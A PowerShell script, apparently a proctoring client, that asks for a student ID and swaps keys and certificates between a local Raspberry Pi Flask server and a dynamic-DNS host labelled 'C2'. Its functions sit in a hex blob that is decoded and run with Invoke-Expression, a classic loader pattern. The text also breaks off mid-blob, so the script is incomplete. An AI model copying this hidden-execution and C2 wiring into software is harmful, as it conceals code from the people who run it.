# Load Windows Forms
Add-Type -AssemblyName System.Windows.Forms

# Base URL of the Flask server
$base_url = "http://10.0.0.1:8000"
$c2_root_ca_url = "https://rapid.tlnas.duckdns.org/get_root_ca.php"


# Function to check if a student ID file exists on the server
function Check-StudentID {
    try {
        $response = Invoke-RestMethod -Uri "$base_url/check_studentid" -Method Get
        return $response.exists
    } catch {
        Write-Error "Failed to check student ID on Flask server: $_"
        return $false
    }
}

# Function to prompt for Student ID using a pop-up window
function Prompt-StudentID {
    [void][System.Reflection.Assembly]::LoadWithPartialName("System.Drawing")
    [void][System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")

    $form = New-Object System.Windows.Forms.Form
    $form.Text = "Enter Student ID"
    $form.Size = New-Object System.Drawing.Size(300,150)
    $form.StartPosition = "CenterScreen"

    $label = New-Object System.Windows.Forms.Label
    $label.Text = "Student ID:"
    $label.Location = New-Object System.Drawing.Point(10,20)
    $label.Size = New-Object System.Drawing.Size(80,20)
    $form.Controls.Add($label)

    $textbox = New-Object System.Windows.Forms.TextBox
    $textbox.Location = New-Object System.Drawing.Point(100,20)
    $textbox.Size = New-Object System.Drawing.Size(150,20)
    $form.Controls.Add($textbox)

    $okButton = New-Object System.Windows.Forms.Button
    $okButton.Text = "OK"
    $okButton.Location = New-Object System.Drawing.Point(50,60)
    $okButton.Add_Click({
        $form.Tag = $textbox.Text
        $form.DialogResult = [System.Windows.Forms.DialogResult]::OK
        $form.Close()
    })
    $form.Controls.Add($okButton)

    $cancelButton = New-Object System.Windows.Forms.Button
    $cancelButton.Text = "Cancel"
    $cancelButton.Location = New-Object System.Drawing.Point(150,60)
    $cancelButton.Add_Click({
        $form.Tag = $null
        $form.DialogResult = [System.Windows.Forms.DialogResult]::Cancel
        $form.Close()
    })
    $form.Controls.Add($cancelButton)

    $result = $form.ShowDialog()

    if ($result -eq [System.Windows.Forms.DialogResult]::OK) {
        return $form.Tag
    } else {
        return $null
    }
}

# Check if student ID file exists on the server
$exists = Check-StudentID
if (-not $exists) {
    $studentid = Prompt-StudentID
    if (-not $studentid) {
        Write-Host "No Student ID provided. Exiting script."
        return
    }
} else {
    $studentid = "NotInputted"
}

# Define proctoring functions into a variable to use it in background jobs
$functions = {
    param ($studentid)
    $hexFunctions = @"
    232046756e6374696f6e732e7073310d0a0d0a66756e6374696f6e2049735f436f6e6e6563746564207b0d0a2020202024636865636b203d204765742d506e70446576696365202d50726573656e744f6e6c79207c2057686572652d4f626a656374207b20245f2e496e7374616e63654964202d6d6174636820275e5553425c5c5649445f3144364227207d0d0a202020206966202824636865636b29207b0d0a202020202020202057726974652d486f7374202252617370626572727920506920636f6e6e65637465642e22202d466f726567726f756e64436f6c6f7220477265656e0d0a202020202020202072657475726e2027464f554e44270d0a202020207d20656c7365207b0d0a202020202020202057726974652d486f73742022526173706265727279205069206e6f7420636f6e6e65637465642e22202d466f726567726f756e64436f6c6f72205265640d0a202020202020202072657475726e20246e756c6c0d0a202020207d0d0a7d0d0a0d0a66756e6374696f6e204765742d456e637279707465642d4b6579207b0d0a20202020747279207b0d0a202020202020202024726573706f6e7365203d20496e766f6b652d526573744d6574686f64202d557269202224626173655f75726c2f6765745f656e637279707465645f6b657922202d4d6574686f64204765740d0a202020202020202057726974652d486f737420224665746368656420656e63727970746564206b65792066726f6d20466c61736b207365727665722e22202d466f726567726f756e64436f6c6f7220477265656e0d0a202020202020202072657475726e2024726573706f6e73652e656e637279707465645f6b65790d0a202020207d206361746368207b0d0a202020202020202057726974652d4572726f7220224661696c656420746f2067657420656e63727970746564206b65792066726f6d20466c61736b207365727665723a20245f220d0a202020202020202072657475726e20246e756c6c0d0a202020207d0d0a7d0d0a0d0a66756e6374696f6e204765742d43322d43657274207b0d0a20202020706172616d20280d0a20202020202020205b737472696e675d24656e637279707465645f6b65790d0a20202020290d0a20202020747279207b0d0a202020202020202024726573706f6e7365203d20496e766f6b652d526573744d6574686f64202d55726920222463325f726f6f745f63615f75726c22202d4d6574686f6420506f7374202d426f64792028407b206b6579203d2024656e637279707465645f6b6579207d207c20436f6e76657274546f2d4a736f6e29202d436f6e74656e745479706520276170706c69636174696f6e2f6a736f6e270d0a202020202020202057726974652d486f737420224665746368656420656e6372797074656420433220726f6f742063657274696669636174652e22202d466f726567726f756e64436f6c6f7220477265656e0d0a202020202020202072657475726e2024726573706f6e73652e636572740d0a202020207d206361746368207b0d0a202020202020202057726974652d4572726f7220224661696c656420746f2067657420656e6372797074656420433220726f6f742063657274696669636174653a20245f220d0a202020202020202072657475726e20246e756c6c0d0a202020207d0d0a7d0d0a0d0a66756e6374696f6e205665726966792d43322d43657274207b0d0a20202020706172616d20280d0a20202020202020205b737472696e675d24656e637279707465645f636572740d0a20202020290d0a20202020747279207b0d0a202020202020202024726573706f6e7365203d20496e766f6b652d526573744d6574686f64202d557269202224626173655f75726c2f7665726966795f63325f6365727422202d4d6574686f6420506f7374202d426f64792028407b2063657274203d2024656e637279707465645f63657274207d207c20436f6e76657274546f2d4a736f6e29202d436f6e74656e745479706520276170706c69636174696f6e2f6a736f6e270d0a202020202020202057726974652d486f73742022566572696669656420433220726f6f74206365727469666963617465206f6e20466c61736b207365727665722e22202d466f726567726f756e64436f6c6f7220477265656e0d0a202020202020202072657475726e2024726573706f6e73650d0a202020207d206361746368207b0d0a202020202020202057726974652d4572726f7220224661696c656420746f2076657269667920433220726f6f74206365727469666963617465206f6e20466c61736b207365727665723a20245f220d0a202020202020202072657475726e20246e756c6c0d0a202020207d0d0a7d0d0a0d0a66756e6374696f6e2046657463685f435352207b0d0a20202020706172616d20280d0a20202020202020205b737472696e675d2473747564656e7469640d0a20202020290d0a20202020747279207b0d0a202020202020202024726573706f6e7365203d20496e766f6b652d526573744d6574686f64202d557269202224626173655f75726c2f6765745f63737222202d4d6574686f6420476574202d426f647920407b2073747564656e746964203d202473747564656e746964207d202d436f6e74656e745479706520226170706c69636174696f6e2f6a736f6e220d0a202020202020202057726974652d486f7374202246657463686564204353522066726f6d20466c61736b207365727665722e22202d466f726567726f756e64436f6c6f7220477265656e0d0a202020202020202072657475726e2024726573706f6e73650d0a202020207d206361746368207b0d0a202020202020202057726974652d4572726f7220224661696c656420746f206665746368204353522066726f6d20466c61736b207365727665723a20245f220d0a202020202020202072657475726e20246e756c6c0d0a202020207d0d0a7d0d0a0d0a66756e6374696f6e2053656e645f435352207b0d0a20202020706172616d20280d0a20202020202020205b5053437573746f6d4f626a6563745d246373725f726573706f6e73650d0a20202020290d0a20202020747279207b0d0a202020202020202024726573706f6e7365203d20496e766f6b652d526573744d6574686f64202d557269202463325f7369676e696e675f75726c202d4d6574686f6420506f7374202d426f64792028246373725f726573706f6e7365207c20436f6e76657274546f2d4a736f6e29202d436f6e74656e745479706520276170706c69636174696f6e2f6a736f6e270d0a202020202020202057726974652d486f7374202253656e742043535220746f2043322053657276657220616e64207265636569766564207369676e65642063657274696669636174652e22202d466f726567726f756e64436f6c6f7220477265656e0d0a202020202020202057726974652d486f73742024726573706f6e73650d0a202020202020202072657475726e2024726573706f6e73650d0a202020207d206361746368207b0d0a202020202020202057726974652d4572726f7220224661696c656420746f2073656e642043535220746f204332205365727665723a20245f220d0a202020202020202072657475726e20246e756c6c0d0a202020207d0d0a7d0d0a0d0a66756e6374696f6e2053656e645f5369676e65645f43657274207b0d0a20202020706172616d20280d0a20202020202020205b737472696e675d247369676e65645f636572740d0a20202020290d0a20202020747279207b0d0a202020202020202024726573706f6e7365203d20496e766f6b652d526573744d6574686f64202d557269202224626173655f75726c2f726563656976655f6365727422202d4d6574686f6420506f7374202d426f64792028407b2063657274203d20247369676e65645f63657274207d207c20436f6e76657274546f2d4a736f6e29202d436f6e74656e745479706520276170706c69636174696f6e2f6a736f6e270d0a202020202020202057726974652d486f7374202253656e74207369676e6564206365727469666963617465206261636b20746f20466c61736b207365727665722e22202d466f726567726f756e64436f6c6f7220477265656e0d0a202020202020202072657475726e2024726573706f6e73650d0a202020207d206361746368207b0d0a202020202020202057726974652d4572726f7220224661696c656420746f2073656e64207369676e656420636572746966696361746520746f20466c61736b207365727665723a20245f220d0a202020202020202072657475726e20246e756c6c0d0a202020207d0d0a7d0d0a0d0a66756e6374696f6e20436865636b5f43657274207b0d0a20202020747279207b0d0a202020202020202024726573706f6e7365203d20496e766f6b652d526573744d6574686f64202d557269202224626173655f75726c2f636865636b5f6365727422202d4d6574686f64204765740d0a202020202020202057726974652d486f73742022436865636b656420666f72206578697374696e67206365727469666963617465206f6e20466c61736b207365727665722e22202d466f726567726f756e64436f6c6f7220477265656e0d0a202020202020202072657475726e2024726573706f6e73650d0a202020207d206361746368207b0d0a202020202020202057726974652d4572726f7220224661696c656420746f20636865636b20666f72206365727469666963617465206f6e20466c61736b207365727665723a20245f220d0a202020202020202072657475726e20246e756c6c0d0a202020207d0d0a7d0d0a0d0a66756e6374696f6e205665726966795f43657274207b0d0a20202020706172616d20280d0a20202020202020205b5053437573746f6d4f626a6563745d24636572745f726573706f6e73650d0a20202020290d0a20202020747279207b0d0a202020202020202024726573706f6e7365203d20496e766f6b652d526573744d6574686f64202d557269202463325f7665726966795f75726c202d4d6574686f6420506f7374202d426f6479202824636572745f726573706f6e7365207c20436f6e76657274546f2d4a736f6e29202d436f6e74656e745479706520276170706c69636174696f6e2f6a736f6e270d0a202020202020202057726974652d486f7374202256657269666965642063657274696669636174652077697468204332205365727665722e22202d466f726567726f756e64436f6c6f7220477265656e0d0a202020202020202072657475726e2024726573706f6e73650d0a202020207d206361746368207b0d0a202020202020202057726974652d4572726f7220224661696c656420746f207665726966792063657274696669636174652077697468204332205365727665723a20245f220d0a202020202020202072657475726e20246e756c6c0d0a202020207d0d0a7d0d0a0d0a66756e6374696f6e20436865636b5f43415f43657274207b0d0a20202020747279207b0d0a202020202020202024656e637279707465645f6b6579203d204765742d456e637279707465642d4b65790d0a2020202020202020696620282d6e6f742024656e637279707465645f6b657929207b0d0a20202020202020202020202057726974652d486f737420224661696c656420746f2067657420656e63727970746564204665726e6574206b65792e2045786974696e672066756e6374696f6e2e220d0a20202020202020202020202072657475726e20246e756c6c0d0a20202020202020207d0d0a0d0a202020202020202024656e637279707465645f63657274203d204765742d43322d43657274202d656e637279707465645f6b65792024656e637279707465645f6b65790d0a2020202020202020696620282d6e6f742024656e637279707465645f6365727429207b0d0a20202020202020202020202057726974652d486f737420224661696c656420746f2067657420656e6372797074656420433220726f6f742063657274696669636174652e2045786974696e672066756e6374696f6e2e220d0a20202020202020202020202072657475726e20246e756c6c0d0a20202020202020207d0d0a0d0a202020202020202024726573706f6e7365203d205665726966792d43322d43657274202d656e637279707465645f636572742024656e637279707465645f636572740d0a20202020202020206966202824726573706f6e73652e737461747573202d657120226e65775f636572745f6e65656465642229207b0d0a20202020202020202020202057726974652d486f737420224e657720726f6f74206365727469666963617465206e65656465642e2050726f63656564696e6720776974682048616e646c655f4365727469666963617465735f4f6e63652e220d0a20202020202020202020202072657475726e2024726573706f6e73652e7374617475730d0a20202020202020207d20656c73656966202824726573706f6e73652e737461747573202d6571202276616c69642229207b0d0a20202020202020202020202057726974652d486f73742022433220726f6f742063657274696669636174652069732076616c69642e220d0a20202020202020202020202072657475726e2024726573706f6e73652e7374617475730d0a20202020202020207d20656c7365207b0d0a20202020202020202020202057726974652d4572726f7220224661696c656420746f2076657269667920433220726f6f742063657274696669636174652e2045786974696e672066756e6374696f6e2e220d0a20202020202020202020202072657475726e20246e756c6c0d0a20202020202020207d0d0a202020207d206361746368207b0d0a202020202020202057726974652d4572726f722022416e206572726f72206f6363757272656420647572696e672043412063657274696669636174652068616e646c696e673a20245f220d0a202020202020202072657475726e20246e756c6c0d0a202020207d0d0a7d0d0a0d0a66756e6374696f6e2053656e645f546f6b656e5f546f5f466c61736b207b0d0a20202020706172616d20280d0a20202020202020205b737472696e675d24636f6d62696e65645f656e637279707465645f646174610d0a20202020290d0a20202020747279207b0d0a202020202020202024726573706f6e7365203d20496e766f6b652d526573744d6574686f64202d557269202224626173655f75726c2f726563656976655f746f6b656e22202d4d6574686f6420506f7374202d426f64792028407b2064617461203d2024636f6d62696e65645f656e637279707465645f64617461207d207c20436f6e76657274546f2d4a736f6e29202d436f6e74656e745479706520276170706c69636174696f6e2f6a736f6e270d0a202020202020202057726974652d486f737420225265646972656374656420456e6372797074656420546f6b656e206461746120746f20466c61736b207365727665722e22202d466f726567726f756e64436f6c6f7220477265656e0d0a202020202020202072657475726e2024726573706f6e73650d0a202020207d206361746368207b0d0a202020202020202057726974652d4572726f7220224661696c656420746f20726564697265637420636f6d62696e656420656e63727970746564206461746120746f20466c61736b207365727665723a20245f220d0a202020202020202072657475726e20246e756c6c0d0a202020207d0d0a7d0d0a0d0a66756e6374696f6e2048616e646c655f4365727469666963617465735f4f6e6365207b0d0a20202020706172616d20282473747564656e746964290d0a202020206966202849735f436f6e6e6563746564202d6e6520246e756c6c29207b0d0a2020202020202020747279207b0d0a2020202020202020202020202463615f636572745f737461747573203d20436865636b5f43415f436572740d0a202020202020202020202020696620282463615f636572745f737461747573202d657120226e65775f636572745f6e65656465642229207b0d0a20202020202020202020202020202020246373725f726573706f6e7365203d2046657463685f435352202d73747564656e746964202473747564656e7469640d0a2020202020202020202020202020202069662028246373725f726573706f6e7365202d657120246e756c6c29207b0d0a202020202020202020202020202020202020202057726974652d4572726f7220224661696c656420746f206665746368204353522e2045786974696e672063657274696669636174652068616e646c696e672070726f636573732e220d0a202020202020202020202020202020202020202072657475726e0d0a202020202020202020202020202020207d0d0a0d0a20202020202020202020202020202020247369676e65645f636572745f726573706f6e7365203d2053656e645f435352202d6373725f726573706f6e736520246373725f726573706f6e73650d0a2020202020202020202020202020202069662028247369676e65645f636572745f726573706f6e7365202d657120246e756c6c29207b0d0a202020202020202020202020202020202020202057726974652d4572726f7220224661696c656420746f20676574207369676e65642063657274696669636174652e2045786974696e672063657274696669636174652068616e646c696e672070726f636573732e220d0a202020202020202020202020202020202020202072657475726e0d0a202020202020202020202020202020207d0d0a0d0a20202020202020202020202020202020247369676e65645f63657274203d20247369676e65645f636572745f726573706f6e73652e636572740d0a202020202020202020202020202020202473656e645f636572745f726573706f6e7365203d2053656e645f5369676e65645f43657274202d7369676e65645f6365727420247369676e65645f636572740d0a20202020202020202020202020202020696620282473656e645f636572745f726573706f6e7365202d657120246e756c6c29207b0d0a202020202020202020202020202020202020202057726974652d4572726f7220224661696c656420746f2073656e64207369676e656420636572746966696361746520746f20466c61736b207365727665722e2045786974696e672063657274696669636174652068616e646c696e672070726f636573732e220d0a202020202020202020202020202020202020202072657475726e0d0a202020202020202020202020202020207d0d0a0d0a2020202020202020202020202020202057726974652d486f7374202243657274696669636174652068616e646c696e672070726f6365737320636f6d706c65746564207375636365737366756c6c792e22202d466f726567726f756e64436f6c6f7220477265656e0d0a2020202020202020202020207d20656c7365696620282463615f636572745f737461747573202d6571202276616c69642229207b0d0a2020202020202020202020202020202024636572745f726573706f6e7365203d20436865636b5f436572740d0a202020202020202020202020202020206966202824636572745f726573706f6e73652e737461747573202d65712022636572745f6578697374732229207b0d0a20202020202020202020202020202020202020206966202824636572745f726573706f6e73652e737461747573202d65712022636572745f6578697374732229207b0d0a202020202020202020202020202020202020202020202020247665726966795f726573706f6e7365203d205665726966795f43657274202d636572745f726573706f6e73652024636572745f726573706f6e73650d0a20202020202020202020202020202020202020202020202069662028247665726966795f726573706f6e73652e737461747573202d65712022737563636573732229207b0d0a2020202020202020202020202020202020202020202020202020202057726974652d486f7374202243657274696669636174652069732076616c69642e22202d466f726567726f756e64436f6c6f7220477265656e0d0a0d0a20202020202020202020202020202020202020202020202020202020232052656469726563742074686520726573706f6e736520746f20466c61736b207365727665720d0a202020202020202020202020202020202020202020202020202020202472656469726563745f726573706f6e7365203d2053656e645f546f6b656e5f546f5f466c61736b202d636f6d62696e65645f656e637279707465645f6461746120247665726966795f726573706f6e73652e6d6573736167650d0a20202020202020202020202020202020202020202020202020202020696620282472656469726563745f726573706f6e7365202d657120246e756c6c29207b0d0a202020202020202020202020202020202020202020202020202020202020202057726974652d4572726f7220224661696c656420746f20726564697265637420726573706f6e736520746f20466c61736b207365727665722e220d0a202020202020202020202020202020202020202020202020202020207d0d0a2020202020202020202020202020202020202020202020202020202072657475726e0d0a2020202020202020202020202020202020202020202020207d20656c736569662028247665726966795f726573706f6e73652e737461747573202d657120226572726f722229207b0d0a202020202020202020202020202020202020202020202020202020207377697463682028247665726966795f726573706f6e73652e6d65737361676529207b0d0a202020202020202020202020202020202020202020202020202020202020202022436572746966696361746520686173206265656e207265766f6b65642e22207b0d0a20202020202020202020202020202020202020202020202020202020202020202020202057726974652d4572726f722022436572746966696361746520686173206265656e207265766f6b65642e2041626f7274696e672070726f636573732e220d0a20202020202020202020202020202020202020202020202020202020202020202020202072657475726e0d0a20202020202020202020202020202020202020202020202020202020202020207d0d0a202020202020202020202020202020202020202020202020202020202020202022496e76616c6964207369676e61747572652e22207b0d0a20202020202020202020202020202020202020202020202020202020202020202020202057726974652d4572726f7220224365727469666963617465207369676e617475726520697320696e76616c69642e2050726f63656564696e6720776974682063657274696669636174652068616e646c696e672070726f636573732e220d0a20202020202020202020202020202020202020202020202020202020202020207d0d0a20202020202020202020202020202020202020202020202020202020202020202254696d657374616d70206973206f7574736964652074686520616c6c6f7765642074696d652077696e646f772e22207b0d0a20202020202020202020202020202020202020202020202020202020202020202020202057726974652d4572726f72202243657274696669636174652074696d657374616d7020697320696e76616c69642e2050726f63656564696e6720776974682063657274696669636174652068616e646c696e672070726f636573732e220d0a20202020202020202020202020202020202020202020202020202020202020207d0d0a202020202020202020202020202020202020202020202020202020202020202064656661756c74207b0d0a20202020202020202020202020202020202020202020202020202020202020202020202057726974652d4572726f7220224365727469666963617465206973206e6f742076616c69642e2050726f63656564696e6720776974682063657274696669636174652068616e646c696e672070726f636573732e220d0a20202020202020202020202020202020202020202020202020202020202020207d0d0a202020202020202020202020202020202020202020202020202020207d0d0a2020202020202020202020202020202020202020202020207d0d0a20202020202020202020202020202020202020207d0d0a202020202020202020202020202020207d20656c7365207b0d0a202020202020202020202020202020202020202057726974652d4572726f7220224e6f20636572746966696361746520666f756e64206f6e20466c61736b207365727665722e2050726f63656564696e6720776974682063657274696669636174652068616e646c696e672070726f636573732e220d0a202020202020202020202020202020207d0d0a0d0a20202020202020202020202020202020246373725f726573706f6e7365203d2046657463685f435352202d73747564656e746964202473747564656e7469640d0a2020202020202020202020202020202069662028246373725f726573706f6e7365202d657120246e756c6c29207b0d0a202020202020202020202020202020202020202057726974652d4572726f7220224661696c656420746f206665746368204353522e2045786974696e672063657274696669636174652068616e646c696e672070726f636573732e220d0a202020202020202020202020202020202020202072657475726e0d0a202020202020202020202020202020207d0d0a0d0a20202020202020202020202020202020247369676e65645f636572745f726573706f6e7365203d2053656e645f435352202d6373725f726573706f6e736520246373725f726573706f6e73650d0a2020202020202020202020202020202069662028247369676e65645f636572745f726573706f6e7365202d657120246e756c6c29207b0d0a202020202020202020202020202020202020202057726974652d4572726f7220224661696c656420746f20676574207369676e65642063657274696669636174652e2045786974696e672063657274696669636174652068616e646c696e672070726f636573732e220d0a202020202020202020202020202020202020202072657475726e0d0a202020202020202020202020202020207d0d0a0d0a20202020202020202020202020202020247369676e65645f63657274203d20247369676e65645f636572745f726573706f6e73652e636572740d0a202020202020202020202020202020202473656e645f636572745f726573706f6e7365203d2053656e645f5369676e65645f43657274202d7369676e65645f6365727420247369676e65645f636572740d0a20202020202020202020202020202020696620282473656e645f636572745f726573706f6e7365202d657120246e756c6c29207b0d0a202020202020202020202020202020202020202057726974652d4572726f7220224661696c656420746f2073656e64207369676e656420636572746966696361746520746f20466c61736b207365727665722e2045786974696e672063657274696669636174652068616e646c696e672070726f636573732e220d0a202020202020202020202020202020202020202072657475726e0d0a202020202020202020202020202020207d0d0a0d0a2020202020202020202020202020202057726974652d486f7374202243657274696669636174652068616e646c696e672070726f6365737320636f6d706c65746564207375636365737366756c6c792e22202d466f726567726f756e64436f6c6f7220477265656e0d0a2020202020202020202020207d20656c7365207b0d0a2020202020202020202020202020202057726974652d4572726f7220224661696c656420746f2068616e646c652043412063657274696669636174652e220d0a2020202020202020202020207d0d0a20202020202020207d206361746368207b0d0a20202020202020202020202057726974652d4572726f722022416e206572726f72206f6363757272656420647572696e67207468652063657274696669636174652068616e646c696e672070726f636573733a20245f220d0a20202020202020207d0d0a202020207d0d0a7d
"@

    # Remove any new lines or whitespace characters
    $hexFunctions = $hexFunctions -replace "\s", ""

    # Convert the hex string back to byte array
    $byteArray = @()
    for ($i = 0; $i -lt $hexFunctions.Length; $i += 2) {
        $byteArray += [Convert]::ToByte($hexFunctions.Substring($i, 2), 16)
    }

    # Convert the byte array to string content
    $decodedContent = [System.Text.Encoding]::UTF8.GetString($byteArray)

    # Execute the decoded content
    Invoke-Expression $decodedContent

    # Define necessary variables
    $key = 'https://rapid.tlnas.duckdns.org/get_public_key.php'
    $base_url = 'http://10.0.0.1:8000'
    $c2_signing_url = 'https://rapid.tlnas.duckdns.org/sign_csr.php'
    $c2_verify_url = 'https://rapid.tlnas.duckdns.org/verify_cert.php'
    $c2_root_ca_url = 'https://rapid.tlnas.duckdns.org/get_root_ca.php'

    # Retrieve public key from web server
    try {
        $pub_key = Invoke-WebRequest -Uri $key -UseBasicParsing
        Write-Host "Retrieved public key from web server." -ForegroundColor Green
    } catch {
        Write-Error "Failed to retrieve public key from web server: $_"
        return
    }

    # Send public key to Flask server in JSON format
    $key_data = @{PuK = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($pub_key.tostring()))}
    $completed = $false

    if (Is_Connected -ne $null) {
        try {
            $response = Invoke-WebRequest -Uri $base_url -Method POST -Body ($key_data | ConvertTo-Json) -ContentType 'application/json'
            $completed = $true
            Write-Host "Public key sent to Flask server." -ForegroundColor Green
        } catch {
            Write-Error "Failed to send public key to Flask server: $_"
            return
        }

        # Handle the certificates
        Handle_Certificates_Once -studentid $studentid
    } else {
        Write-Error "Raspberry Pi not connected. Exiting script."
        return
    }
}

# Start the certificate handling job
$certJob = Start-Job -ScriptBlock $functions -ArgumentList $studentid

# Wait for the job to complete and output the results
Wait-Job $certJob
Receive-Job $certJob

# Update Token Job
$jobScriptBlock = {
    param($base_url, $c2_verify_url)
    $hexFunctions = @"
    232046756e6374696f6e732e7073310d0a0d0a66756e6374696f6e2049735f436f6e6e6563746564207b0d0a2020202024636865636b203d204765742d506e70446576696365202d50726573656e744f6e6c79207c2057686572652d4f626a656374207b20245f2e496e7374616e63654964202d6d6174636820275e5553425c5c5649445f3144364227207d0d0a202020206966202824636865636b29207b0d0a202020202020202057726974652d486f7374202252617370626572727920506920636f6e6e65637465642e22202d466f726567726f756e64436f6c6f7220477265656e0d0a202020202020202072657475726e2027464f554e44270d0a202020207d20656c7365207b0d0a202020202020202057726974652d486f73742022526173706265727279205069206e6f7420636f6e6e65637465642e22202d466f726567726f756e64436f6c6f72205265640d0a202020202020202072657475726e20246e756c6c0d0a202020207d0d0a7d0d0a0d0a66756e6374696f6e204765742d456e637279707465642d4b6579207b0d0a20202020747279207b0d0a202020202020202024726573706f6e7365203d20496e766f6b652d526573744d6574686f64202d557269202224626173655f75726c2f6765745f656e637279707465645f6b657922202d4d6574686f64204765740d0a202020202020202057726974652d486f737420224665746368656420656e63727970746564206b65792066726f6d20466c61736b207365727665722e22202d466f726567726f756e64436f6c6f7220477265656e0d0a202020202020202072657475726e2024726573706f6e73652e656e637279707465645f6b65790d0a202020207d206361746368207b0d0a202020202020202057726974652d4572726f7220224661696c656420746f2067657420656e63727970746564206b65792066726f6d20466c61736b207365727665723a20245f220d0a202020202020202072657475726e20246e756c6c0d0a202020207d0d0a7d0d0a0d0a66756e6374696f6e204765742d43322d43657274207b0d0a20202020706172616d20280d0a20202020202020205b737472696e675d24656e637279707465645f6b65790d0a20202020290d0a20202020747279207b0d0a202020202020202024726573706f6e7365203d20496e766f6b652d526573744d6574686f64202d55726920222463325f726f6f745f63615f75726c22202d4d6574686f6420506f7374202d426f64792028407b206b6579203d2024656e637279707465645f6b6579207d207c20436f6e76657274546f2d4a736f6e29202d436f6e74656e745479706520276170706c69636174696f6e2f6a736f6e270d0a202020202020202057726974652d486f737420224665746368656420656e6372797074656420433220726f6f742063657274696669636174652e22202d466f726567726f756e64436f6c6f7220477265656e0d0a202020202020202072657475726e2024726573706f6e73652e636572740d0a202020207d206361746368207b0d0a202020202020202057726974652d4572726f7220224661696c656420746f2067657420656e6372797074656420433220726f6f742063657274696669636174653a20245f220d0a202020202020202072657475726e20246e756c6c0d0a202020207d0d0a7d0d0a0d0a66756e6374696f6e205665726966792d43322d43657274207b0d0a20202020706172616d20280d0a20202020202020205b737472696e675d24656e637279707465645f636572740d0a20202020290d0a20202020747279207b0d0a202020202020202024726573706f6e7365203d20496e766f6b652d526573744d6574686f64202d557269202224626173655f75726c2f7665726966795f63325f6365727422202d4d6574686f6420506f7374202d426f64792028407b2063657274203d2024656e637279707465645f63657274207d207c20436f6e76657274546f2d4a736f6e29202d436f6e74656e745479706520276170706c69636174696f6e2f6a736f6e270d0a202020202020202057726974652d486f73742022566572696669656420433220726f6f74206365727469666963617465206f6e20466c61736b207365727665722e22202d466f726567726f756e64436f6c6f7220477265656e0d0a202020202020202072657475726e2024726573706f6e73650d0a202020207d206361746368207b0d0a202020202020202057726974652d4572726f7220224661696c656420746f2076657269667920433220726f6f74206365727469666963617465206f6e20466c61736b207365727665723a20245f220d0a202020202020202072657475726e20246e756c6c0d0a202020207d0d0a7d0d0a0d0a66756e6374696f6e2046657463685f435352207b0d0a20202020706172616d20280d0a20202020202020205b737472696e675d2473747564656e7469640d0a20202020290d0a20202020747279207b0d0a202020202020202024726573706f6e7365203d20496e766f6b652d526573744d6574686f64202d557269202224626173655f75726c2f6765745f63737222202d4d6574686f6420476574202d426f647920407b2073747564656e746964203d202473747564656e746964207d202d436f6e74656e745479706520226170706c69636174696f6e2f6a736f6e220d0a202020202020202057726974652d486f7374202246657463686564204353522066726f6d20466c61736b207365727665722e22202d466f726567726f756e64436f6c6f7220477265656e0d0a202020202020202072657475726e2024726573706f6e73650d0a202020207d206361746368207b0d0a202020202020202057726974652d4572726f7220224661696c656420746f206665746368204353522066726f6d20466c61736b207365727665723a20245f220d0a202020202020202072657475726e20246e756c6c0d0a202020207d0d0a7d0d0a0d0a66756e6374696f6e2053656e645f435352207b0d0a20202020706172616d20280d0a20202020202020205b5053437573746f6d4f626a6563745d246373725f726573706f6e73650d0a20202020290d0a20202020747279207b0d0a202020202020202024726573706f6e7365203d20496e766f6b652d526573744d6574686f64202d557269202463325f7369676e696e675f75726c202d4d6574686f6420506f7374202d426f64792028246373725f726573706f6e7365207c20436f6e76657274546f2d4a736f6e29202d436f6e74656e745479706520276170706c69636174696f6e2f6a736f6e270d0a202020202020202057726974652d486f7374202253656e742043535220746f2043322053657276657220616e64207265636569766564207369676e65642063657274696669636174652e22202d466f726567726f756e64436f6c6f7220477265656e0d0a202020202020202057726974652d486f73742024726573706f6e73650d0a202020202020202072657475726e2024726573706f6e73650d0a202020207d206361746368207b0d0a202020202020202057726974652d4572726f7220224661696c656420746f2073656e642043535220746f204332205365727665723a20245f220d0a202020202020202072657475726e20246e756c6c0d0a202020207d0d0a7d0d0a0d0a66756e6374696f6e2053656e645f5369676e65645f43657274207b0d0a20202020706172616d20280d0a20202020202020205b737472696e675d247369676e65645f636572740d0a20202020290d0a20202020747279207b0d0a202020202020202024726573706f6e7365203d20496e766f6b652d526573744d6574686f64202d557269202224626173655f75726c2f726563656976655f6365727422202d4d6574686f6420506f7374202d426f64792028407b2063657274203d20247369676e65645f63657274207d207c20436f6e76657274546f2d4a736f6e29202d436f6e74656e745479706520276170706c69636174696f6e2f6a736f6e270d0a202020202020202057726974652d486f7374202253656e74207369676e6564206365727469666963617465206261636b20746f20466c61736b207365727665722e22202d466f726567726f756e64436f6c6f7220477265656e0d0a202020202020202072657475726e2024726573706f6e73650d0a202020207d206361746368207b0d0a202020202020202057726974652d4572726f7220224661696c656420746f2073656e64207369676e656420636572746966696361746520746f20466c61736b207365727665723a20245f220d0a202020202020202072657475726e20246e756c6c0d0a202020207d0d0a7d0d0a0d0a66756e6374696f6e20436865636b5f43657274207b0d0a20202020747279207b0d0a202020202020202024726573706f6e7365203d20496e766f6b652d526573744d6574686f64202d557269202224626173655f75726c2f636865636b5f6365727422202d4d6574686f64204765740d0a202020202020202057726974652d486f73742022436865636b656420666f72206578697374696e67206365727469666963617465206f6e20466c61736b207365727665722e22202d466f726567726f756e64436f6c6f7220477265656e0d0a202020202020202072657475726e2024726573706f6e73650d0a202020207d206361746368207b0d0a202020202020202057726974652d4572726f7220224661696c656420746f20636865636b20666f72206365727469666963617465206f6e20466c61736b207365727665723a20245f220d0a202020202020202072657475726e20246e756c6c0d0a202020207d0d0a7d0d0a0d0a66756e6374696f6e205665726966795f43657274207b0d0a20202020706172616d20280d0a20202020202020205b5053437573746f6d4f626a6563745d24636572745f726573706f6e73650d0a20202020290d0a20202020747279207b0d0a202020202020202024726573706f6e7365203d20496e766f6b652d526573744d6574686f64202d557269202463325f7665726966795f75726c202d4d6574686f6420506f7374202d426f6479202824636572745f726573706f6e7365207c20436f6e76657274546f2d4a736f6e29202d436f6e74656e745479706520276170706c69636174696f6e2f6a736f6e270d0a202020202020202057726974652d486f7374202256657269666965642063657274696669636174652077697468204332205365727665722e22202d466f726567726f756e64436f6c6f7220477265656e0d0a202020202020202072657475726e2024726573706f6e73650d0a202020207d206361746368207b0d0a202020202020202057726974652d4572726f7220224661696c656420746f207665726966792063657274696669636174652077697468204332205365727665723a20245f220d0a202020202020202072657475726e20246e756c6c0d0a